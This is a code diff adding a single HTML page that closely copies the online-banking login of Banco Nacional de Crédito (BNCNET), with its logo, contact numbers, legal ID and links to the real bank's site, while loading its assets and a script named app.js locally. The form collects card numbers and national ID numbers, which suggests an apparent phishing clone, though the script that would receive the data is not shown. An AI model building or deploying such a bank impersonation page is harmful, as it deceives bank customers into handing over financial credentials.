@@ -1,0 +1,313 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <!-- 1. Enlace a la librería externa de Font Awesome -->
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"
+    />
+    <!-- 2. Enlace a tu propio archivo de estilos locales -->
+    <link rel="stylesheet" href="styles.css" />
+    <title>BNCNET - Login Personas Naturales</title>
+    <!-- Favicon -->
+    <link rel="icon" type="image/x-icon" href="imagenes/favicon.ico" />
+  </head>
+  <body>
+    <div class="container3">
+      <div class="primera">
+        <div class="primera-parte">
+          <div>
+            <img
+              src="imagenes/LogoBNC.png"
+              class="foto-sin-espacio"
+              alt="LogoBNC"
+            />
+          </div>
+          <div class="segundo-hijo">
+            <i class="fa-solid fa-calendar"></i>
+            <div id="fecha-actual"></div>
+          </div>
+        </div>
+        <div class="primerBorde">
+          <div class="container1">
+            <div class="persona">
+              <div class="mi-tipo tipo1 tipo-activo">Personas</div>
+              <div class="mi-tipo tipo2 tipo-apagado">Empresas</div>
+            </div>
+            <div class="element1">
+              <div class="bn-uno">
+                <h2 class="sub-titulo"
+                  
+                >
+                  Iniciar Sesión
+                </h2>
+                <div class="bienvenida">
+                  <div class="saludoUno">
+                    <p>¡</p>
+                    <p id="elemento-saludo">Buenas tardes</p>
+                    <p>,</p>
+                    <p id="saludo" style="font-weight: bold; margin-left: 10px">
+                      Bienvenido
+                    </p>
+                    <p>!</p>
+                  </div>
+                </div>
+                <p style="text-align: center">Ingrese sus credenciales</p>
+              </div>
+              <div class="botonesTipoTarjeta">
+                <div class="mi-boton tarjeta1 activo">Débito | Crédito</div>
+                <div class="mi-boton tarjeta2 apagado">Tarjeta Débito BOD</div>
+              </div>
+              <hr style="margin: 8px 0 11px 0" />
+
+              <!-- Contenedor Tarjeta -->
+              <div class="contenedor-del-input">
+                <i class="fa-solid fa-credit-card" style="color: gray"></i>
+                <div class="input-group">
+                  <input
+                    type="number"
+                    class="prueba"
+                    id="numeroDeTarjeta"
+                    placeholder=" "
+                  />
+
+                  <label for="numeroDeTarjeta">Número de Tarjeta</label>
+                </div>
+                <p id="error-tarjeta" class="tarje-ta">
+                  El Número de Tarjeta es Obligatorio
+                </p>
+              </div>
+              <!-- Contenedor Cédula -->
+              <div class="contenedor-del-input conte-nedor">
+                <i class="fa-solid fa-id-card" style="color: gray"></i>
+                <div class="input-group">
+                  <input
+                    type="number"
+                    class="prueba"
+                    id="cedulaDeIdentidad"
+                    placeholder=" "
+                  />
+                  <label for="cedulaDeIdentidad">Cédula de identidad</label>
+                </div>
+                <p id="error-cedula" class="cedu-la">
+                  La Cédula de Identidad es Obligatoria
+                </p>
+              </div>
+              <button
+                id="btnValidar"
+                style="
+                  border-radius: 5px;
+                  font-weight: 900;
+                  width: 100%;
+                  height: 47px;
+                  cursor: pointer;
+                "
+              >
+                Continuar
+              </button>
+              <hr style="margin-top: 11px" />
+              <div class="forgot-password">
+                <i class="fas fa-lock"></i>
+                <a
+                  href="https://personas.bncenlinea.com/Auth/RestorePsw"
+                  target="_blank"
+                  class="clave"
+                  rel="noopener"
+                >
+                  ¿Olvidaste tu clave?
+                </a>
+              </div>
+              <div class="pieLogin">
+                <p class="pie-login" >
+                  Tus datos se encuentran protegidos por nuestro certificado de
+                  seguridad digital (TLS/SSL)
+                </p>
+                <img src="imagenes/digicert.svg" alt="digicert" />
+              </div>
+            </div>
+            <!---- element1 -->
+          </div>
+          <!-- container1 -->
+          <div class="segundo-elemento">
+            <div class="pr">EN UN CLIC</div>
+            <div class="se">
+              Realiza tus operaciones con seguridad, todos los días del año y
+              desde donde te encuentres.
+            </div>
+            <!-- Tercer Bloque -->
+            <div class="te-te">
+              
+                <div class="teuno"><a
+                href="https://www.bncenlinea.com/paso-a-paso-con-el-bnc"
+                target="_blank"
+                rel="noopener"
+              >
+                  <div class="te-uno">
+                    <div class="icon-teuno">
+                      <img src="imagenes/otros/registro.png" alt="Registro" />
+                      <p class="title-uno">Registrarte en BNCNET</p>
+                    </div>
+                    <p class="parrafo">
+                      Conoce el paso a paso para registrate por primera vez en
+                      BNCNET y disfrutar las ventajas de nuestra banca en línea.
+                    </p>
+                    <div class="arrow-right">
+                      <p  class="enla-ce">
+                        HAZ CLIC AQUÍ
+                      </p>
+                      <i class="fas fa-arrow-right"></i>
+                    </div>
+                  </div>
+                </a></div>
+              
+              
+                <div class="tedos"><a
+                href="https://www.bncenlinea.com/productos-y-servicios/operaciones-en-moneda-extranjera"
+                target="_blank"
+                rel="noopener"
+              >
+                  <div class="te-dos">
+                    <div class="icon-tedos">
+                      <div class="dollar-euro">
+                        <i class="fa-solid fa-dollar-sign"></i>
+                        <i class="fa-solid fa-euro-sign"></i>
+                      </div>
+                      <p class="title-uno">BNC en Moneda Extranjera</p>
+                    </div>
+                    <p class="parrafo">
+                      Te ofrecemos cuentas, tarjetas y operaciones en Moneda
+                      Extranjera. ¡Las opciones que esperabas!
+                    </p>
+                    <div class="arrow-right">
+                      <p class="enla-ce" >
+                        HAZ CLIC AQUÍ
+                      </p>
+                      <i class="fas fa-arrow-right"></i>
+                    </div>
+                  </div>
+                </a></div>
+              
+              
+                <div class="tetres"><a
+                href="https://www.bncenlinea.com/listado-de-agencias-y-taquillas"
+                target="_blank"
+                rel="noopener"
+              >
+                  <div class="te-tres">
+                    <div class="icon-tetres">
+                      <img src="imagenes/otros/agencias.png" alt="Agencias" />
+                      <p class="title-uno">Agencias BNC</p>
+                    </div>
+                    <p class="parrafo">
+                      Conoce la ubicación de nuestra Red de Agencias y Taquillas a
+                      nivel nacional.
+                    </p>
+                    <div class="arrow-right">
+                      <p class="enla-ce">
+                        HAZ CLIC AQUÍ
+                      </p>
+                      <i class="fas fa-arrow-right"></i>
+                    </div>
+                  </div>
+                </a></div>
+              
+            </div>
+            <!-- Cuarto Bloque -->
+            <div class="cu">
+              <div class="cu-uno">
+                <div>
+                  <i class="fas fa-phone" aria-hidden="true"></i>Centro de
+                  atención al cliente BNC: 24 horas, los 7 días de la semana.
+                </div>
+                <div>
+                  Área Metropolitana (0212-597-50-00) - Interior del país
+                  0500-BNC5000 (2625000)
+                </div>
+              </div>
+              <hr class="sepa-racion"/>
+
+              <div class="cu-dos">
+                <div>Síguenos por nuestras redes:</div>
+                <div class="iconos-pie">
+                  <a
+                    href="https://www.instagram.com/bncbanco"
+                    target="_blank"
+                    rel="noopener"
+                  >
+                    <div class="enlace">
+                      <div class="btn-instagram">
+                        <i class="fa-brands fa-instagram"></i>
+                      </div>
+                    </div>
+                  </a>
+
+                  <a
+                    href="https://x.com/bncbanco_"
+                    target="_blank"
+                    rel="noopener"
+                  >
+                    <div class="enlace">
+                      <div class="btn-twitter">
+                        <i class="fa-brands fa-x-twitter"></i>
+                      </div>
+                    </div>
+                  </a>
+                  <a
+                    href="https://www.facebook.com/BNCbanco"
+                    target="_blank"
+                    rel="noopener"
+                  >
+                    <div class="enlace">
+                      <div class="btn-facebook">
+                        <i class="fa-brands fa-facebook"></i>
+                      </div>
+                    </div>
+                  </a>
+                  <a
+                    href="https://www.linkedin.com/company/banco-nacional-de-credito/"
+                    target="_blank"
+                    rel="noopener"
+                  >
+                    <div class="enlace">
+                      <div class="btn-linkedin">
+                        <i class="fa-brands fa-linkedin-in"></i>
+                      </div>
+                    </div>
+                  </a>
+                  <a
+                    href="https://www.youtube.com/user/BNCBanco"
+                    target="_blank"
+                    rel="noopener"
+                  >
+                    <div class="enlace">
+                      <div class="btn-youtube">
+                        <i class="fab fa-youtube"></i>
+                      </div>
+                    </div>
+                  </a>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+        <!-- Primer Borde -->
+      </div>
+      <!--Primera-->
+      <div class="piePagina">
+        <div class="salto">
+          &copy; 2026 Banco Nacional de Crédito, C.A. Banco Universal. <div></div> Todos los
+          Derechos Reservados. RIF: J-30984132-7
+        </div>
+        
+        <p class="final" style="margin-top: 5px; color: rgb(255, 219, 143); font-weight: 900">
+          La información mostrada en este sitio es confidencial
+        </p>
+      </div>
+    </div>
+    <!-- Container 3 -->
+
+    <script src="app.js"></script>
+  </body>
+</html>
